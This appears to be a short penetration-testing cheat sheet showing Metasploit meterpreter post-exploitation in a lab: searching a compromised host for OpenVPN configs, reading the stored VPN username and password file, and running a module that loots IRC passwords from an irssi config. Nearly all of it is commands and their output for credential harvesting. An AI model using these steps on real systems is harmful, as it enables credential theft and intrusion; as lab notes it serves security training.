# Metasploit

## 01 - OpenVPN

### 1.1 - Enumerate

`meterpreter > search -d /path/to/directory/ -f *.ovpn`

### 1.2 - Scenarios

#### 1.2.1 - Password and Keys

```
meterpreter > pwd
/home/user
meterpreter > search -f *.ovpn -d /
Found 1 result...
=================

Path                   Size (bytes)  Modified (UTC)
----                   ------------  --------------
/home/user/myvpn.ovpn  212           2017-05-15 20:14:59 -0400

meterpreter > cat myvpn.ovpn
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0

meterpreter > cat /etc/openvpn/auth.txt
user
password321
meterpreter > run post/multi/gather/irssi_creds

[!] SESSION may not be compatible with this module:
[!]  * incompatible session type: meterpreter
[*] Finding ~/.irssi/config
[*] Looting 1 files
[+] Found IRC password(s) of password321 in irssi config at /home/user/.irssi/config
[+] irssi config with passwords stored in /root/.msf4/loot/20220523133749_default_10.10.198.41_irssiconfigfil_990648.txt

$ sudo cat /root/.msf4/loot/20220523133749_default_10.10.198.41_irssiconfigfil_990648.txt | grep -i passw
    autosendcmd = "/msg nickserv identify password321 ;wait 2000";
```